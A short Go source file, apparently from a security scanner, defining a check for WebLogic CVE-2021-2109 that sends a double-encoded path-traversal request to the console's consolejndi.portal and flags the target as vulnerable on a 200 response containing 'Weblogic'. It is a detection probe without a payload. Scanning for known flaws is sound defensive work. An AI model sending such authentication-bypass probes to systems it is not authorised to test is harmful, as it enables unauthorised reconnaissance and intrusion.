package weblogic

import (
	"github.com/yhy0/ChYing/pkg/Jie/pkg/protocols/httpx"
	"github.com/yhy0/logging"
	"strings"
)

func CVE_2021_2109(url string, client *httpx.Client) bool {
	if req, err := client.Request(url+"/console/css/%252e%252e%252f/consolejndi.portal", "GET", "", nil, "Poc WebLogic"); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "Weblogic") {
			logging.Logger.Infoln("[Vulnerable] CVE_2021_2109 ", url)
			return true
		}
	}
	logging.Logger.Debugln("[Safety] CVE_2021_2109 ", url)
	return false
}
